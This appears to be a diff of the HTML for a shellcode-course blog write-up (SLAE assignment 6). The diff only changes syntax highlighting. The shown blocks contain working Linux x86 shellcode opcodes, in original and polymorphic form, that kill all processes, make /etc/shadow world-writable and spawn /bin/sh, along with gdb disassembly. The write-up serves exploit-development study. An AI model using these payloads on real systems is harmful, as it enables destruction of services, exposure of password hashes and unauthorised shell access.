@@ -20,13 +20,13 @@
   <span class="k">push</span> <span class="n">byte</span> <span class="mi">9</span>
   <span class="k">pop</span> <span class="n">ecx</span>
   <span class="k">int</span> <span class="mh">0x80</span>
-</code></pre></div> <h4 id="compiling-the-original-shellcode">Compiling the Original Shellcode</h4> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh kill-all-processes-original
-[+] Assembling with Nasm
-[+] Linking
-[+] Extracting Opcodes
-"\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80"
-[+] Size: 11 bytes
-skawa@ubuntu:~/Desktop/code/assignment/assignment6$
+</code></pre></div> <h4 id="compiling-the-original-shellcode">Compiling the Original Shellcode</h4> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment6$ </span>./compile.sh <span class="nb">kill</span>-all-processes-original
+<span class="o">[</span>+] Assembling with Nasm
+<span class="o">[</span>+] Linking
+<span class="o">[</span>+] Extracting Opcodes
+<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">25</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="o">[</span>+] Size: 11 bytes
+skawa@ubuntu:~/Desktop/code/assignment/assignment6<span class="err">$</span>
 </code></pre></div> <h4 id="polymorphic-shellcode">Polymorphic Shellcode</h4> <p>The polymorphic version of the shellcode I have created can be found <a href="https://github.com/skahwah/slae/blob/master/assignment6/kill-all-processes.nasm">here</a></p> <p>Below is an explanation of the changes.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;kill-all-processes.nasm</span>
 <span class="c">;this kills all processes on the local system</span>
 <span class="c">;Linux x86</span>
@@ -50,13 +50,13 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment6$
   <span class="k">push</span> <span class="n">byte</span> <span class="o">-</span><span class="mi">1</span>
   <span class="k">pop</span> <span class="n">ebx</span>
   <span class="k">int</span> <span class="mh">0x80</span>
-</code></pre></div> <h4 id="compiling-the-polymorphic-shellcode">Compiling the Polymorphic Shellcode</h4> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh kill-all-processes
-[+] Assembling with Nasm
-[+] Linking
-[+] Extracting Opcodes
-"\x6a\x09\xb0\x09\xb1\x04\xf6\xe1\xfe\xc0\x59\x6a\xff\x5b\xcd\x80"
-[+] Size: 16 bytes
-skawa@ubuntu:~/Desktop/code/assignment/assignment6$
+</code></pre></div> <h4 id="compiling-the-polymorphic-shellcode">Compiling the Polymorphic Shellcode</h4> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment6$ </span>./compile.sh <span class="nb">kill</span>-all-processes
+<span class="o">[</span>+] Assembling with Nasm
+<span class="o">[</span>+] Linking
+<span class="o">[</span>+] Extracting Opcodes
+<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="o">[</span>+] Size: 16 bytes
+skawa@ubuntu:~/Desktop/code/assignment/assignment6<span class="err">$</span>
 </code></pre></div> <h4 id="disassembly-of-the-original-shellcode">Disassembly of the Original Shellcode</h4> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">kill</span><span class="o">-</span><span class="n">all</span><span class="o">-</span><span class="n">processes</span><span class="o">-</span><span class="n">original</span>
 <span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">kill</span><span class="o">-</span><span class="n">all</span><span class="o">-</span><span class="n">processes</span><span class="o">-</span><span class="n">original</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
 <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="n">_start</span>
@@ -161,13 +161,13 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment6$
   <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>
   <span class="k">mov</span> <span class="n">cx</span><span class="p">,</span> <span class="mi">0666</span><span class="n">o</span>
   <span class="k">int</span> <span class="mh">0x80</span>
-</code></pre></div> <h4 id="compiling-the-original-shellcode-1">Compiling the Original Shellcode</h4> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh chmod-original
-[+] Assembling with Nasm
-[+] Linking
-[+] Extracting Opcodes
-"\xb0\x0f\x99\x52\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x66\xb9\xb6\x01\xcd\x80"
-[+] Size: 27 bytes
-skawa@ubuntu:~/Desktop/code/assignment/assignment6$
+</code></pre></div> <h4 id="compiling-the-original-shellcode-1">Compiling the Original Shellcode</h4> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment6$ </span>./compile.sh chmod-original
+<span class="o">[</span>+] Assembling with Nasm
+<span class="o">[</span>+] Linking
+<span class="o">[</span>+] Extracting Opcodes
+<span class="s2">"</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="o">[</span>+] Size: 27 bytes
+skawa@ubuntu:~/Desktop/code/assignment/assignment6<span class="err">$</span>
 </code></pre></div> <h4 id="polymorphic-shellcode-1">Polymorphic Shellcode</h4> <p>The polymorphic version of the shellcode I have created can be found <a href="https://github.com/skahwah/slae/blob/master/assignment6/chmod-shadow.nasm">here</a></p> <p>Below is an explanation of the changes.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;chmod-shadow.nasm</span>
 <span class="c">;this changes the permissions for /etc/shadow to 666</span>
 <span class="c">;Linux x86</span>
@@ -195,13 +195,13 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment6$
   <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>  <span class="c">;stack pointer</span>
   <span class="k">mov</span> <span class="n">cx</span><span class="p">,</span> <span class="mi">0666</span><span class="n">o</span> <span class="c">; permissions 666</span>
   <span class="k">int</span> <span class="mh">0x80</span>
-</code></pre></div> <h4 id="compiling-the-polymorphic-shellcode-1">Compiling the Polymorphic Shellcode</h4> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh chmod
-[+] Assembling with Nasm
-[+] Linking
-[+] Extracting Opcodes
-"\xb0\x08\x00\xc0\xfe\xc8\x99\x51\x66\x68\x6f\x77\x66\x68\x61\x64\x66\x68\x73\x68\x66\x68\x63\x2f\x66\x68\x65\x74\x66\x68\x2f\x2f\x89\xe3\x66\xb9\xb6\x01\xcd\x80"
-[+] Size: 40 bytes
-skawa@ubuntu:~/Desktop/code/assignment/assignment6$
+</code></pre></div> <h4 id="compiling-the-polymorphic-shellcode-1">Compiling the Polymorphic Shellcode</h4> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment6$ </span>./compile.sh chmod
+<span class="o">[</span>+] Assembling with Nasm
+<span class="o">[</span>+] Linking
+<span class="o">[</span>+] Extracting Opcodes
+<span class="s2">"</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">64</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">b9</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="o">[</span>+] Size: 40 bytes
+skawa@ubuntu:~/Desktop/code/assignment/assignment6<span class="err">$</span>
 </code></pre></div> <h4 id="disassembly-of-the-original-shellcode-1">Disassembly of the Original Shellcode</h4> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">chmod</span><span class="o">-</span><span class="n">original</span>
 <span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">chmod</span><span class="o">-</span><span class="n">original</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
 <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="n">_start</span>
@@ -319,13 +319,13 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment6$
  <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">esp</span>
  <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">11</span>
  <span class="k">int</span> <span class="mh">0x80</span>
-</code></pre></div> <h4 id="compiling-the-original-shellcode-2">Compiling the Original Shellcode</h4> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh execve-bin-sh-stack-original
-[+] Assembling with Nasm
-[+] Linking
-[+] Extracting Opcodes
-"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
-[+] Size: 21 bytes
-skawa@ubuntu:~/Desktop/code/assignment/assignment6$
+</code></pre></div> <h4 id="compiling-the-original-shellcode-2">Compiling the Original Shellcode</h4> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment6$ </span>./compile.sh execve-bin-sh-stack-original
+<span class="o">[</span>+] Assembling with Nasm
+<span class="o">[</span>+] Linking
+<span class="o">[</span>+] Extracting Opcodes
+<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">f7</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="o">[</span>+] Size: 21 bytes
+skawa@ubuntu:~/Desktop/code/assignment/assignment6<span class="err">$</span>
 </code></pre></div> <h4 id="polymorphic-shellcode-2">Polymorphic Shellcode</h4> <p>The polymorphic version of the shellcode I have created can be found <a href="https://github.com/skahwah/slae/blob/master/assignment6/execve-stack-bin-sh.nasm">here</a></p> <p>Below is an explanation of the changes.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;execve-stack-bin-sh.nasm</span>
 <span class="c">;this changes the permissions for /etc/shadow to 666</span>
 <span class="c">;Linux x86</span>
@@ -352,13 +352,13 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment6$
   <span class="k">xchg</span> <span class="n">eax</span><span class="p">,</span> <span class="n">ebx</span> <span class="c">;EAX now contains the correct syscall value, 11.  </span>
                 <span class="c">;EBX contians the stack pointer</span>
   <span class="k">int</span> <span class="mh">0x80</span>
-</code></pre></div> <h4 id="compiling-the-polymorphic-shellcode-2">Compiling the Polymorphic Shellcode</h4> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh execve-bin-sh-stack
-[+] Assembling with Nasm
-[+] Linking
-[+] Extracting Opcodes
-"\x31\xdb\x53\x58\x50\xb3\x06\x00\xdb\xfe\xcb\x66\x68\x73\x68\x66\x68\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe0\x93\xcd\x80"
-[+] Size: 29 bytes
-skawa@ubuntu:~/Desktop/code/assignment/assignment6$
+</code></pre></div> <h4 id="compiling-the-polymorphic-shellcode-2">Compiling the Polymorphic Shellcode</h4> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment6$ </span>./compile.sh execve-bin-sh-stack
+<span class="o">[</span>+] Assembling with Nasm
+<span class="o">[</span>+] Linking
+<span class="o">[</span>+] Extracting Opcodes
+<span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">cb</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
+<span class="o">[</span>+] Size: 29 bytes
+skawa@ubuntu:~/Desktop/code/assignment/assignment6<span class="err">$</span>
 </code></pre></div> <h4 id="disassembly-of-the-original-shellcode-2">Disassembly of the Original Shellcode</h4> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="err">$</span> <span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="p">.</span><span class="o">/</span><span class="n">execve</span><span class="o">-</span><span class="n">bin</span><span class="o">-</span><span class="n">sh</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">original</span>
 <span class="n">Reading</span> <span class="n">symbols</span> <span class="n">from</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">skawa</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">assignment</span><span class="o">/</span><span class="n">assignment6</span><span class="o">/</span><span class="n">execve</span><span class="o">-</span><span class="n">bin</span><span class="o">-</span><span class="n">sh</span><span class="o">-</span><span class="n">stack</span><span class="o">-</span><span class="n">original</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span><span class="n">done</span><span class="p">.</span>
 <span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">break</span> <span class="n">_start</span>
